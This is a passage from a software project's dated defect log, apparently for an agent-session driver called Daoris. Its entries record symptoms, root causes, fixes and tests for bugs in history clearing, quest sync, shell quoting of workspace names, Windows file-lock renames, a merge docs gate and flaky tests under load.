- **Symptom:** found by the second-opinion review's afternoon round and verified in the code, not seen on an install: a workspace's *Clear history…* whose every listed unit changed before the press closed its list with *Cleared 0 of 3 from aurora, 0 B. 3 changed since the list and were kept.* as a success; a press that cleared some was said in the tone of one that cleared all; and records of 0 B were read as *records only, no files here* above a line naming left-over files of 0 B.
- **Root cause:** UXFIX2 gave the clear ACCTEDIT1's `answered`, and `useHistoryActs` called `done()` on every answer. The driver refuses a lone quest's, ask's or failed sessions' clear that stays, but answers a workspace's, so an answer's arrival was read as the act's success, and `clearSaid` toned it `ok`. HIST1k's `takesSaid` chose its sentence from `takes.bytes`, a size that says nothing of whether files exist.
- **Fix:** `clearWent` judges the answer before the ask closes, as `sayDiscard` judges a discard; one that took nothing calls `answered.refused` with `clearRefusal`'s lines, and a partial clear's notice wears the error's tone. Records say their size through `history.reading.takes`. D153's HIST1n note has the detail.
- **Verify:** `history.test.ts`' wholly-kept, partial and records-beside-empty-files cases, `KeptHistory.test.tsx`'s and `ProjectsView.history.test.tsx`'s each failed first, then passed. Not covered: the window.

## 2026-10-07 — an agent quoting a 401 held its account, and a limit's sentence travelled

### Driver: a refused key was read from the agent's words, and a limit's note carried the agent's sentence to every machine (AGT3c)
- **Symptom:** found by D125's reading of the code, not seen on an install: a failed session whose agent's own output ended with `API Error: 401` (quoting a log, testing an error path) held its account as refused and read it signed out; and a limit's record note carried the agent's sentence, its reset in the zone of the machine it was said on, to every reader the note reaches.
- **Root cause:** AGT3b matched its phrase against the transcript's last 40 lines, which on the native and protocol doors are the agent's rendered words as much as the harness's; D125 refused exactly that for a limit and SIGNIN1b for a sign-in, and AGT3b was never moved. ACPEND1's conclusion kept the door's failure as an agent words part, and TOOL4d appended the cooling line after it without taking it out.
- **Fix:** a refused key is read from `HarnessEnding`, what the harness itself said by its door (the protocol door's failure; the native door's failed `result`, its stderr and its lines outside its frames; a text door's transcript beside an exit that was not 0); a limit's conclusion drops the agent's words part (`Unsaid`) and keeps the cooling line's facts. D125's AGT3c note has the detail.
- **Verify:** `RefusedByTheHarnessTests.An_agent_s_words_ending_with_the_refused_phrase_on_a_turn_that_ended_normally_hold_no_account` failed first (`account.refused` appended), and `AccountLimitHoldTests.A_limit_s_note_carries_its_reset_as_a_moment_…` (the sentence in the note); then passed, with the driver's fast half (4655). Not covered: the `Process` half and the family rehearsal's refused-key check, read and not run; a text door still cannot tell its agent's words from its harness's beside an exit that was not 0.
## 2026-10-07 — an anchor given twice, and a fence closed on its quote

### Service: a title that was another's counted anchor failed the refresh, and a fence closed on a shorter one inside it (ORIENT2h3)
- **Symptom:** found by the second-opinion review of 2026-10-07 and verified in the code, not seen on an install: headings `A`, `A`, `A (2)` in one file were anchored `A`, `A (2)`, `A (2)`, and the store's insert failed the repository's whole refresh on the shared id; a four-backtick fence quoting a three-backtick example closed on the example's first fence, and the heading and the table inside it became a section and index rows.
- **Root cause:** each reader that splits a file counted titles in a dictionary of its own and built `title (n)` from the count, never checking the anchors it had already given (`RepositoryScanner`'s sections, declared index and decision notes, `IndexRows`' rows). Each reader also toggled a fence on any line opening with three backticks or tildes, so the closing line's character and length were never compared with the opening's (`MarkdownSections`, `IndexSections`, `IndexRows`).
- **Fix:** one allocator, `EntryAnchors`, which reserves each anchor and counts a taken one on to the next free, keeping every anchor that was unique; one fence scanner, `MarkdownFence`, which closes only on the opening's character at least as long, as CommonMark does. Each reader keeps its own section and table policy. D151's ORIENT2h3 note has the choices.
- **Verify:** `IndexEntriesTests`' and `RepositoryScannerTests`' refreshes of the three headings failed on the store's unique constraint first, then passed with distinct ids; the fenced-example cases in `IndexEntriesTests`, `CheckoutDocumentsTests` and `MarkdownSectionsTests` failed first, then passed. Every id this checkout and both examples yield, 1,948 and 8,996 by the two readings, is unchanged. Not covered: `DecisionNotes.Fenced` and its twin in `tools/doc-duplicates.mjs` still toggle on three backticks.
## 2026-10-07 — an evidence read that failed said missing

### Driver: a lookup git or the disk did not answer read as absence, and held a done for a fact nobody read (EVID1b3)
- **Symptom:** found by the second-opinion review of 2026-10-07 and verified in the code, not seen on an install. An `ls-tree` git did not answer during the case walk, or a folder of the tree the disk would not list, read as `missing` or `uncommitted`. `EvidenceCheck` posted that verdict, so the done stayed held `evidence-missing`.
- **Root cause:** `EvidenceReader.SpelledAsync` took a failed listing as an empty folder, and `InTree` turned an `IOException` or `UnauthorizedAccessException` into false. Only the object lookup told a failure from absence. The base's lookup took a failure as an unsaid change.
- **Fix:** each lookup comes to found, absent or unread. An unread anywhere in an item's read makes the read unread, and nothing is posted, as for the object lookup. The unread names the folder from the tree's root and why. The tree's listing is a seam beside git's. D144's EVID1b3 note has the detail.
- **Verify:** `EvidenceReaderTests`: a walk failing at the root and beneath it, a folder refused and one that failed, and a base lookup git did not answer each failed first as a verdict, then passed. Not covered: a real folder the disk refuses, since a deny on listing did not stop this machine's test process.

## 2026-10-07 — a wait on a lost take held the winner's quest

### Service: a wait made after this machine's take still applied to the winner's quest when that take lost (WAITCLAIM1)
- **Symptom:** seen in a probe by QUESTOP1, not on an install: machine A took a quest offline, its session asked another repository and waited, and machine B's take reached the remote first. After A's pass the quest was B's and waited on A's question on every machine, so B's driver held B's session on a question B never asked.
- **Root cause:** `QuestStore.RebaseAsync` loses this machine's later pending operations after its own lost take only when they move a status (D69's rule, read from `QuestTransitions.Target`). A wait (D79) moves none, so it fell through to `QuestLog.Applies`, which a taken quest satisfies whoever took it.
- **Fix:** a wait after this machine's lost take is lost with it, forgotten by `QuestLog.Lost`'s rule, and the take's conflict names the question after its own note. The rule and its reach are D69's WAITCLAIM1 note.
- **Verify:** `QuestSyncTests.A_wait_made_on_a_take_that_lost_goes_with_the_take_and_the_loss_names_it` failed first (the conflict's note did not name the question, and the winner's quest waited on it), then passed; `A_wait_on_a_quest_this_machine_did_not_take_survives_the_pass_that_drops_a_lost_takes` holds that a wait on another machine's quest is kept. Not covered: a wait made after the pass that found the take lost (D69's note).
## 2026-10-07 — a delete said a held file went

### Driver, modules: *Delete…* said its whole sentence when a file stayed (SESSDEL1)
- **Symptom:** named in D153's HIST1j note, not seen on an install: a conversation deleted while a process held its transcript said, at the terminal, that its record, words, transcript and files had gone, and exited 0; the screen's answer named only what went.
- **Root cause:** HIST1j made `SessionHomeFiles.Remove` answer what went and what failed, by path; `SessionDeletion` read only the names that went, and its sentence was fixed.
- **Fix:** `Remove` also answers each session's names the disk kept (`Stayed`); the delete carries them, says them in its sentence as left over, `SESSION_DELETE` answers `stayed`, and `sessions delete` exits 2. D126's SESSDEL1 note has the detail.
- **Verify:** `SessionDeletionTests`' two held-file cases and `SessionsCommandTests`' exit 2 case failed first on their names and sentences, `DriverModuleSessionsTests`' two on the missing `stayed`; then passed. Not covered: the page's toast, which does not read `stayed` yet.

## 2026-10-07 — a clear counted a held file as freed

### Driver, service: a clear of finished history counted bytes the disk kept, and the service hid its failed removals (HIST1j)
- **Symptom:** found by the second-opinion review of 2026-10-07 and verified in the code, not seen on an install: a transcript a process held stayed on the disk while the size the clear said and its `history.cleared` line's `bytes` counted it; a kept file the service could not remove was neither counted as failed nor left out of the bytes.
- **Root cause:** HIST1c measured each cleared session before removing it and summed the measure whatever the removal did, and added the kept files' size as the press read them, though the service removes those; `QuestFiles.Forget` swallowed its failures as D95's best-effort delete had, so they never reached the answer. The suffix list and `SessionHomeFiles.Own` described the same files twice.
- **Fix:** one descriptor inventory in `SessionHomeFiles` that measures, removes and names a left-over file; `Remove` returns what went, its bytes, and what failed, each path measured again where the disk refuses; the driver frees kept bytes only as far as they left the disk; `QuestFiles.Forget` says whether anything stayed and the history press answers `failed: { quests, asks }`, additively. D153's HIST1j note has the detail.
- **Verify:** `HistoryClearingTests`' held-file and service-failed cases, `HistoryCommandTests`' exit 2 case, `HistoryDeskTests`' and `LocalHostTests`' `failed` cases each failed first, then passed. Not covered: a real disk letting a folder go in part, and the route's real hold off Windows.

## 2026-10-07 — a history verb's printed command broke on a spaced workspace

### Driver: `history` and `history clear --workspace` printed the workspace bare in the command they name (HIST1i)
- **Symptom:** found by the second-opinion review of 2026-10-07 and verified in the code, not seen on an install: the reading's *`daoris-driver history clear --workspace <name>` lists it first* and the list's *`… --yes` clears what this list holds* printed `my team` as two arguments and `R&D` as a command Command Prompt runs.
- **Root cause:** HIST1d's `HistoryCommand.Door` interpolated the workspace as it was; ACCTQUOTE1b had spelled every driver command that named a workspace before HIST1d added one.
- **Fix:** `Door` spells the workspace through `ShellWord.Of(…, ShellWord.Workspace)`; D153's HIST1i note says why a quest's or an ask's id needs no spelling.
- **Verify:** `HistoryCommandTests.A_workspace_in_a_printed_command_is_spelled_for_any_shell`, a spaced and an `R&D` row, failed first on the reading's line, then passed. Not covered: a command a later verb adds goes through `ShellWord` only if its author sends it there.
## 2026-10-07 — an evidence verdict judged twice, differently

### Service: the wire took a `spelled` the evidence door refused (REFAC3)
- **Symptom:** read from the code by a second opinion (`docs/2026-10-07-second-opinion-review.md`), not seen on an install: a verdict whose item named `spelled` on a `missing` or `found` read was refused at `POST /api/quests/{id}/evidence` but read whole from another machine's push, and replayed.
- **Root cause:** EVID1a wrote the verdict's field rules twice, in `QuestEvidenceVerdict.Judged` for the wire and `QuestExchange.JudgeVerdict` for the door, and only the door kept `spelled` to a `case` read. Neither checked that the spelling is the same path in another case.
- **Fix:** `QuestEvidenceVerdict.JudgeShape`, one judge of the shape both call, returning the field at fault (`QuestVerdictFault`); coverage stays the exchange's and the replay's. D144's REFAC3 note names what is refused now.
- **Verify:** `QuestEvidenceTests.A_verdict_is_taken_or_refused_alike_at_both_doors`: thirty-one shapes through both doors; the two disagreeing rows failed first (taken on the wire, refused at the door), and the two new `spelled` rows failed at both. Not covered: no reader writes a verdict yet (EVID1b).
## 2026-10-07 — a lost wait that stopped its circle's push

### Service: a wait made on a quest another machine closed first stopped every later push of its circle (QUESTOP1)
- **Symptom:** read from the code while listing where a quest operation kind goes, not seen on an install: a taker's `waited`, made before this machine fetched another machine's close of that quest, was rebased into a `conflict` naming no attempted status. The wire requires one, so a remote refused the whole push as not whole (400, `QuestWire.Shape`), and the pending conflict went up and was refused again on every pass.
- **Root cause:** `QuestStore.RebaseAsync` made a conflict of every pending operation it had no rule for, reading the attempted status from `QuestTransitions.Target`, which is null for a kind that moves none. D79 (`8f51e8c6`) added `waited` without a rule there; D95 later dropped a wait on a deleted quest, but not one on a quest still there and no longer taken.
- **Fix:** `QuestLog.Lost` gives every kind its rebase rule (forgotten, a conflict, or kept), and only a move becomes a conflict; a wait whose quest is no longer taken is forgotten. A kind with no rule throws rather than make a conflict nobody can push. `.claude/knowledge/quest-operations.md` names it among a kind's places.
- **Verify:** `QuestSyncTests.A_wait_on_a_quest_another_machine_closed_first_is_dropped_and_the_circle_still_pushes` failed first (the push read back as not whole), then passed; `QuestOperationKindsTests` holds that every kind has a rule and only a move becomes a conflict. Commit `74bbb550`. Not changed: a wait made after this machine's take, when that take loses, still applies to the winner's quest, which then waits on the loser's question (seen in a probe, left for a decision).

## 2026-10-07 — a deleted conversation's files left behind

### Driver: *Delete…* of a conversation left four of its files under the home (HIST1c)
- **Symptom:** read from the code by the history-clearing design's inventory (§0, §2.2), not seen on an install: after SESSUX1f's delete, a conversation's go-on mark (`.cannot.json`), its choice of a new session (`.new-session.json`), its entry in `sessions/held-words.json` and its closed entry in `sessions/auto-landings.json` stayed, naming a record that was gone. The hand purge of 2026-10-07 missed the `spawn/<id>.*` files the same way.
- **Root cause:** `SessionDeletion.RemoveFiles` listed the files the home kept of a session when D126 §5.1 was written; MSG1b, MSG1g, MSG1d4 and LAND2b each added one later, and nothing tied a new per-session file to the delete.
- **Fix:** `SessionHomeFiles`, one helper holding every per-session file the design's §2.2 names, which the delete and HIST1c's clear both call; `HeldWordsFile.Forget` and `AutoLandings.Forget` take a session's entries out of the shared files. An automatic landing still trying stays.
- **Verify:** `SessionDeletionTests`' case for the four files and the spawn files failed first (what went lacked their names), then passed; `HistoryClearingTests` hold the same files for a clear. Not covered: a per-session file added later is caught only if its author names it in the helper.

## 2026-10-07 — a story's language remembered for the page

### Web: after a 中文 story, every later story came up in 中文 (STORY2)
- **Symptom:** found by TRACE1b on its stories: once a 中文 story had been shown, the next story loaded in that browser profile, an English one too, came up in 中文.
- **Root cause:** nine story modules made their 中文 reader at module scope with `i18n.cloneInstance({ lng: 'zh' })`, a habit since LANG1b (`d18c7619`). An i18next clone shares the page's services, its language detector among them, and the clone's own start runs `changeLanguage`, which hands the language to the detector's cache: `zh` under `daoris.language`, the key the page reads at its next load. Storybook imports a story's module to show any story in it, so opening an English story in such a file was enough. The menu bar's stories cloned at render in either language, so they also overwrote a 中文 choice with English.
- **Fix:** `src/Daoris.Web/src/storyLanguage.tsx`: `readerIn(language)` builds a reader with `i18n.createInstance` from the page's options. It has no detector, so it has nothing to remember with. `chinese` is the one 中文 decorator the stories share. The page's own switch still remembers.
- **Verify:** `storyLanguage.test.tsx`: a 中文 story's module, imported and rendered with `daoris.language` set, leaves it as found (failed first: `zh`); every story module imported leaves it absent (failed: `zh`); no story calls `cloneInstance` (failed: ten files); the page's switch still remembers. `stories.test.tsx` clears the key before each story and fails one that writes it (the menu bar's nineteen failed first). Commit `8d537188`. Not run: the stories in a browser, which the parent shoots.

## 2026-10-07 — the driver's commands and a timeout read as a close

### Driver: a command the driver named broke when pasted, and its join refusal left the CLI's (ACCTQUOTE1b)
- **Symptom:** read from the code, not seen on an install: the driver's holds, refusals and Ask Daoris's terminal twins printed an account's id or a workspace's name bare, so `--workspace my team` handed two words and `--profile R&D` ran `D` in Command Prompt; `JoinProblem.Sentence` differed from the CLI's `joinRefusal` for a workspace that needs quotes.
- **Root cause:** ACCTQUOTE1 spelled the CLI's hints and the page's twins only; every driver producer still interpolated the value as it was.
- **Fix:** `ShellWord`, the driver's twin of `shellword.ts`, reading the same table; every producer goes through it. D125's ACCTQUOTE1b note lists them.
- **Verify:** `ShellWordTests` holds every row of `shell-words.json`; `AccountJoinTwinTests` holds the join refusal to the CLI's words for a spaced and an `R&D` workspace; each producer's case failed first. Commit `b885c8df`. Not run: the shells themselves, which the CLI's suite holds the table against.

### Driver host: a look that timed out printed *driver: stopped.* and exited 0 (DEV3b)
- **Symptom:** read from the code and DEV3a's note: a `--once` or `--until-idle` run whose own request met the client's timeout ended as a person's close, so a stalled service read as a clean run.
- **Root cause:** the host's one catch took every `OperationCanceledException` for Ctrl+C, and its close token lived inside the try, so the catch could not ask whether the close was asked for.
- **Fix:** the close is made before the try, and `DriverCommand.Cancelled` reads a cancellation by it: the close is still exit 0; the client's timeout is a failure naming it, exit 2.
- **Verify:** `SessionsOutliveTheirLookTests`' DEV3b cases over a quest list that never answers, for both runs and a close; `DriverCommandTests` on the reading and the host's catch. Not run: the host as a process. Note under D115.

## 2026-10-07 — a single run left before what it caused had landed

### Driver: `--once` could end with its session working and its stop unsaid (DEV3a)
- **Symptom:** the family rehearsal's *its driver stops its own losing session* failed once under load (311/312, FLAKE1 below): the record stood down, and the run's print had no `stop  session` line.
- **Root cause:** since DEV3, `RunOnceAsync` waits for its sessions in `SettleAsync`, whose passes beside them caught only the close. Anything else a pass threw left the run with its sessions working and the lines it had gathered, a lost-claim stop's included. The claim question's client timeout was such a throw (the stop caught only an unreachable host), and the host's catch read it as a close: *driver: stopped.*, exit 0. `--until-idle` printed nothing until the whole run returned, so a later failed look dropped every earlier look's lines.
- **Fix:** the stop reads the client's timeout as no answer; a failed pass beside the sessions is a line and the next pass runs; both runs hand each report to `said` as it is made, and what ended before a failure or close lets go; the headless host prints from it.
- **Verify:** four failing-first cases in `SessionsOutliveTheirLookTests` over the stand-in ledger, its claim door stalled past a 200 ms client timeout (the timeout escaped with the session working). Not run: the rehearsal, which never kept the failed run's transcript, so this is the cause the code admits. Note under D115.
## 2026-10-07 — GATE1, the docs gate blind at a merge

### Gates: a merge passed the docs gate, then failed it once committed (TOOL4e)
- **Symptom:** the 2026-10-02 merge of TOOL4e and SESSUX1a (`435cfef3`) passed every gate the merge tool ran, then `verify` failed on main: the devkit's docs gate found the root README, last committed 2026-10-01 (`f60afc69`), a day behind `src/Daoris.Cli/src`, which TOOL4e changed on 2026-10-02 (`0a861ef0`). Main stayed red until the next merge (`cf76bc7f`) edited the README; its message says every gate passed but the docs-date check.
- **Root cause:** the merge tool merges `--no-ff --no-commit` and gates before the commit exists, and `DocsGate.cs` dates each side by `git log -1 --format=%aI -- <path>` from HEAD. During the merge HEAD was still main, where the README and the CLI's source had both last changed on 2026-10-01; the branch's commits were reachable only from MERGE_HEAD. The other docs checks (budgets, shapes, duplicates, the orientation index, the devkit's other gates) read files or the index, and saw the merge. No one change introduced it: the merge tool has gated before committing since MOD9.
- **Fix:** `tools/as-merged.mjs` runs a command with git's HEAD as the commit an open merge would make: the tree `git add -A` would stage, on HEAD and MERGE_HEAD, behind a git folder holding only HEAD, an index copy and `commondir`. Outside a merge it runs the command unchanged. The `universal` gate and `verify`'s devkit step run through it, and `gateKind` orders a wrapped command as what it wraps. The devkit's own half is GATE1b: the docs gate builds the same commit when a `MERGE_HEAD` exists (D26's GATE1b note).
- **Verify:** `node --test tools/as-merged.test.mjs` (8), in scratch repositories of TOOL4e's shape: the gate's rule alone, the devkit's own docs gate and the merge tool's run each fail the open merge through it and pass it bare, all seen passing with the old pass-through first; a README fixed in the merge passes; outside a merge the command's output and exit are its own. `npm run verify` passes. GATE1b: `DocsGateMergeTests` (5), three seen failing first; the devkit case in `as-merged.test.mjs` now fails the merge bare too.
- **Commit:** `bc373b74`; GATE1b `c3da356e`.

## 2026-10-07 — account edits and hints

### Agents: a refused account edit lost what the person entered (ACCTEDIT1)
- **Symptom:** an account row's Rename… or Use in a workspace…, refused by the driver, closed at once and showed the refusal as a toast; the typed name and ticked workspaces were gone.
- **Root cause:** `AgentPage.tsx` closed each inline question when it was pressed, before its asynchronous bridge mutation answered, so a refusal arrived after the form that could show it had gone.
- **Fix:** each question is handed an answer (`done` or `refused(sentence)`) that closes it only once the mutation lands; a refusal keeps the draft and shows the driver's sentence inside the form, and *Never mind* waits while an answer is pending.
- **Verify:** mocked-bridge vitest cases where rejected mutations keep each draft and a successful retry closes it; stories `RenameRefused`, `UseInAWorkspaceRefused`. Commit `50a5b692`.

### Hints: an account name pasted into a shell could run something else (ACCTQUOTE1)
- **Symptom:** a valid account name such as `R&D` appeared bare in rename and join hints; pasted into Command Prompt it ran `D`.
- **Root cause:** every producer interpolated the value as it was. Quoting alone does not fix it: Windows PowerShell 5.1 drops the quotes of a space-free argument handed to a batch file, and the install's `daoris` is `daoris.cmd`.
- **Fix:** one spelling, twinned in the CLI and the page: bare, double-quoted, or a placeholder where no spelling holds in all three shells.
- **Verify:** `shellword.test.ts` passes each table row through the install's real cmd, PowerShell 5.1 and sh launchers. Commit `30461847`; D125's ACCTQUOTE1 note.
## 2026-10-07 — store numbers taken back by a removal

### Service: a removal could hand out again a number a remote or a push cursor had passed
- **Symptom:** read from the code, not seen on an install (D153's design §0.3, H1 and H2): after D126's delete took the newest session record, the next record was written at a revision the push cursor had passed, so it never went up. After a quest's numbered operations were removed, as the hand purge removed them, the next move took a sequence the remote held: the next fetch took the remote's operation for it, or the remote answered its push as a retry, and the move was lost without an error.
- **Root cause:** an operation's sequence was `MAX(sequence) + 1` over this machine's rows in `quest_log`, and a revision `MAX(revision) + 1` over `sessions` (SYNC1, SYNC4). A maximum over rows goes back when the newest rows go, and another party keys by both numbers: a remote and a fetch name an operation by machine and sequence, and a push sends what was written past its cursor. Latent until a record could be removed: SESSUX1f's delete (`96b932c4`) reached H2 directly; D95's outright removal reaches H1 only narrowly.
- **Fix:** HIST1a: high-water marks in the store, `quest_machine.sequence` and a one-row `session_revision`, each moved by a trigger in the statement that writes the number; the next number is one past the larger of the rows' maximum and the mark, and a store from before seeds each at what it holds. D153's HIST1a note says what building it settled.
- **Verify:** eight tests in `QuestLogTests`, `SessionStoreTests`, `QuestSyncTests` and `SessionSyncTests`, the last two over the wire. Six failed before the build; each seed and trigger, broken in turn, fails the tests that hold it, the two written after the build among them. `dotnet test src/Daoris.Service` passes 1178 and 68.

## 2026-10-07 — a downloaded tool's folder held by Windows

### Tools: a managed download could not move into place while the scanner held it
- **Symptom:** `toolinstall.test.ts`'s download case failed with `EPERM ... rename '<home>/tools/gh/2.62.0.part' -> '.../2.62.0'` twice in one day, at a subagent's verify and at SIGNIN1b's merge gate, both under parallel load; it passed alone.
- **Root cause:** both twins moved the staging folder with a bare rename (`renameSync` in `toolinstall.ts`, `Directory.Move` in `ToolInstall.cs`) just after unpacking an executable into it. The scanner opens a new executable, and a folder cannot be renamed while a file in it is held. It is the 2026-10-03 and 2026-10-07 publishing defect in a third place; on an install it would refuse a real tool download.
- **Fix:** the CLI gains `renameHeld` in `src/fsx.ts`, the zero-dependency twin of `tools/fsx.mjs`'s, and the driver gains `AtomicFile.MoveFolder`; each retries only held-file refusals for a bounded time, and every other failure throws at once.
- **Verify:** failing-first injected-refusal tests in `fsx.test.ts` and `AtomicFileTests` (retried until it gives way, a missing folder throws at once, a held one throws after its tries); `toolinstall.test.ts` and `ToolInstallTests` pass.
- **The rest of the shape, swept the same day:** `toolchain.test.ts`'s pin case met it again in CASEFOLD1's merge gate, at `channels.ts:256`, the agent package's move into the toolchain, whose driver twin is `ReleaseChannel.cs`. Every remaining move of a fresh staging folder into place now waits: those two, and a plugin's install, update and replace (`plugins.ts`, `PluginInstall.cs`). The moves that set a live plugin's folder aside stay bare on purpose: a held folder there is the running hook the refusal names, and it must refuse at once ("refused whole, never half-removed"). `StagedBuild`'s moves keep their own handling.
- **And in the update's swap, which the sweep wrongly left as "its own handling":** the full set's deployment rehearsal rolled an update back twice as `busy` ("a file the swap had to move is held … nothing was changed"), under the heaviest load of the day. `InstallSwap`'s three moves (into place, undo, set aside) were bare, so one scanner hold at the swap's moment rolled back a real update on an install. They now go through `InstallSwap.MoveHeld` (50 tries, 200 ms apart, written in `StagedBuild.cs` itself because the launcher compiles that file alone); a hold that outlasts the tries still rolls back as before. Verify: `StagedBuildTests`' held-for-a-moment case installs, the held-throughout case still rolls back; the launcher builds; the deployment rehearsal rerun.
- **And in the merge tool itself:** CASEFOLD1d's merge stopped with exit 2 before any gate, at `setApartNotes` renaming `D125.md.partial` over `D125.md` (`EPERM`), leaving the rewritten file beside it. Its four write-beside-then-rename sites (setting notes apart, the gate verdicts, the merge's state, each gate's log) now go through `tools/fsx.mjs`'s `renameHeld`. The merge was aborted, the leftover `.partial` removed, and the merge run again.
- **And the rest of the tools (REFAC2, from the 2026-10-07 second-opinion review):** these were still renamed into place bare: the counter's window script (`ux-count.mjs`), both benches' records, the orientation index's files, and the publish's `resources.json` and staged `build.json`. Each of those, the merge tool's three record writes and the knowledge server's pointer now go through one `writeAtomic` in `tools/fsx.mjs`: a beside name no other write shares, `renameHeld`, and the beside file removed when the write fails, so a refused rename leaves the file as it was and nothing beside it. Each gate's log keeps its own beside-and-rename: it streams, and lands whatever the gate wrote. Verify: `tools/fsx.test.mjs` (in `verify`) and the counter's held-write case in `ux-count.test.mjs`, each failing first.

## 2026-10-07 — packaged CLI publication

### Publishing: a fresh folder held by Windows stopped the CLI layout
- **Symptom:** CLI verification failed repeatedly with `EPERM` renaming `.cli-staging` into `app/cli`; the same test passed on earlier reruns.
- **Root cause:** WSSETUP2 (`2cd170b8`) used bare `renameSync` for the unpacked package and both installed folders, bypassing the existing held-file retry used by build staging.
- **Fix:** all three CLI layout renames use the shared `renameHeld` helper. Its bounded wait applies only to held-file errors; other errors still fail.
- **Verify:** a failing-first injected `EPERM` regression retries each of the three real filesystem moves and verifies package/launcher bytes. Both focused CLI layout tests and all 1,294 CLI cases pass; family (374) and deployment (110) rehearsals pass.
- **Commit:** `975978dc`.

## 2026-10-06 — integration review

### Gates: a lane edit could reuse untested verdicts
- **Symptom:** a fixture broadening the steward lane and union patterns accepted old verdicts after source and lane policy changed.
- **Root cause:** record matching trusted declarations from the current checkout; `daoris.lanes.json` forgave itself. Matcher introduced by `12f87a63`, reused by GATE6 (`8ba56b64`).
- **Fix:** record forgiveness requires a stable known-record allowlist; lane policy reaches every gate. Gate declarations cannot classify source as records.
- **Verify:** failing-first regression and all 67 `merge-branch.test.ts` cases pass, including the tool's end-to-end checks.
- **Commit:** `975978dc`.

### Accounts: completion notices ignored the chosen name
- **Symptom:** the recovered Agents regression said an email at sign-in completion and an internal id after changing a default.
- **Root cause:** `harnessRuns.tsx` interpolated bridge identities without resolving them against the roster; the account naming change missed this producer.
- **Fix:** resolve the current cached roster when saying either completion; do not trigger another credential read. Commands and records retain stable ids.
- **Verify:** Agents and menu suites pass all 72 tests; the existing named-account completion case failed before the fix.
- **Commit:** `975978dc`.

### Menus: Help → Update opened above its card
- **Symptom:** Help → Update opened the Driver domain at the top, leaving the update card out of view.
- **Root cause:** UX7a's opener omitted the anchor, and `SettingsAnchor` omitted `update`; the card already had its id. Introduced by `f4e46361`.
- **Fix:** pass the update anchor through the shared Settings opener; the existing observer waits for the card and clears the anchor after scrolling.
- **Verify:** failing-first full-App regression passes, including a later ordinary Settings visit that does not scroll again.
- **Commit:** `975978dc`.

## FLAKE1 (open): real-process tests that fail under load and pass alone (since 2026-09-25)

**Symptom.** A test that starts a real process or runs a real tick fails in a full run and passes alone, and the
next full run is green. Every sighting shares load: parallel builds or live sessions beside the run. The backlog's
FLAKE1 row keeps what to do and its proof; this entry keeps the evidence the cause will be found from (D127 §4.3).

**Sightings** (in place of a root cause until one is found; moved from the backlog on 2026-10-04, as written there).

*One kind found and fixed (2026-10-04):* the CLI's EPERM on a fixture folder at a test's end (`plugin-sources.test.ts`,
`plugins.test.ts`, `setup-kit.test.ts:522`, three sightings that day) is a child still letting go of the folder; the
shared fixture's cleanup (`test/_fixture.ts`) now retries, as the rehearsals' cleans do. Twelve test files still delete
their own folders once; a sighting from one of them is the same kind.

*A second kind found and fixed (2026-10-07):* `plugin-sources.test.ts:317` and `plugins.test.ts:409` still met EPERM in
that retrying cleanup, three sightings under parallel load (a subagent's verify twice, UX7a2's merge gate once). Each test
starts a holder process in the plugin's folder, kills it, then waited a fixed 300 ms: a kill only asks, and under load
the holder had not ended within the wait plus the cleanup's five seconds of retries. Each now waits for the holder's
`exit`, as `setup-kit.test.ts`'s stub runs already wait for `close`.

*Open sightings, 2026-10-07, all under three worktrees building beside a merge's gates, each passing alone or rerun:*
`merge-branch.test.ts`'s `--rerun` cases met git failing on their scratch repositories three ways (a subagent's
`git diff` exiting 2, another's `spawnSync git EPERM`, and UX6a's merge gate's `git merge both failed: fatal: stash
failed`): git's own files held for a moment, most likely by the scanner, the same shape as the publishing renames.
`setup-kit.test.ts:668` (ANSWER1b's stub resumes) met EPERM in `_fixture` cleanup once in INIT1's verify, although
`speak` waits for the stub's `close` on every path; what still held the folder (a git the stub started, or the
scanner) was not captured. The same test failed once more in HIST1c's verify another way, "turn failed: fetch failed"
(the stub's request to its stand-in quest door), passing alone and rerun: the test, not the folder, is the repeat.
`landing-plugins.test.ts` hung for over 25 minutes in UXFIX4's verify, its `land.mjs` child waiting with no children
of its own while another worktree ran the same file; stopped, it passed alone (19/19, 91 s) and the next verify was
green. No child had died, so the wait, not a held file, is the repeat; what the child waited on was not captured.
`SessionsSayCommandTests.Held_words_say_the_drivers_next_look_where_nothing_holds_them` (driver, fast half) exited 2
where 0 was expected, under its 600 ms wait, once in AGT3c's full fast run after merging main; it passed alone three
times and in a full rerun (4656/4656). A fast-half test waiting on a clock is the shape to look at.
The same wait in the family rehearsal (403/404) at HOSTLOG1's merge, 2026-10-08, with three worktrees building beside it
and the run taking 14 m against its usual 8: *with the headless loop running, words said to it are taken up by the SAME
session … going on* read `held: the same session goes on with this at the driver's next look`, while the next check
found the record had worked and ended again in its own conversation. The verb's wait for the loop to take the words
ended first; the change merged (the host's error answer) touches neither the say route nor the loop.
`setup-kit.test.ts:807` (STUB3) failed once in EVID1b3's verify: its stub did not answer `initialize` within 1000 ms,
right after a dotnet run on the same machine; it passed alone and the next verify was green. *Fixed 2026-10-08 (STUB3b
above):* the bound counted the stub's start; it counts from the stub's first answer now.
`merge-branch.test.ts`'s "--passed counts a verdict no path changed since reaches" failed once at the web batch's merge
gate (UXFIX2d…SESSDEL1b, which touch no CLI or tools file): "git could not write the checkout's tree" on its scratch
repository, with three worktrees building beside it; the same git-on-scratch shape as the `--rerun` sightings above.
`landing-plugins.test.ts:267` failed once in UXFIX5b's verify: its fixture's `git config user.email` exited -1
(4294967295), a spawn failure; the file passed 19/19 alone and the next verify was green. A third git-spawn shape.
The family rehearsal's *…its driver stops its own losing session, with the reason on the record* failed again (399/400)
at ORIENT2h2's merge, after DEV3a's fix above: the record WAS stood down (`ended.lost-claim`, its note right), and the
run's print held no `stop  session` line; its one sync line read *quests: the remote could not be reached (… actively
refused it. (localhost:5191))*, so that run's pass did not reach the remote, and the stop came from a pass the print
never showed. The rerun's log replaced the failing one before it was kept; the lines quoted here are what was read.
DEV3b carries it. *Read 2026-10-07 (DEV3b above):* the same run made the stop in a pass beside its session, whose lines
`--once` kept for its end, and the rehearsal's 90 s bound most likely ended it first; a failed check's evidence is now kept.
*Again at CARRY2d's merge (403/404), with DEV3b's evidence kept:* the run printed the take found lost (*held … kept on
the quest as a conflict*), then *failed session …: No connection could be made … (localhost:5197)*; the session's
transcript is the stub's `fetch failed … ECONNRESET`, and host b's log shows it started at 12:48:01, 12:50:10 and
12:51:00. The phase restarts host b to bring it online while the lingering stub's request to it is in flight, so the stub
crashed before the driver's pass could stop it. Not a driver defect: the rehearsal's ordering. DEV3d carries it.
*Read 2026-10-08 (DEV3d above):* the phase's wait for the lingering line read a transcript the driver writes only as the
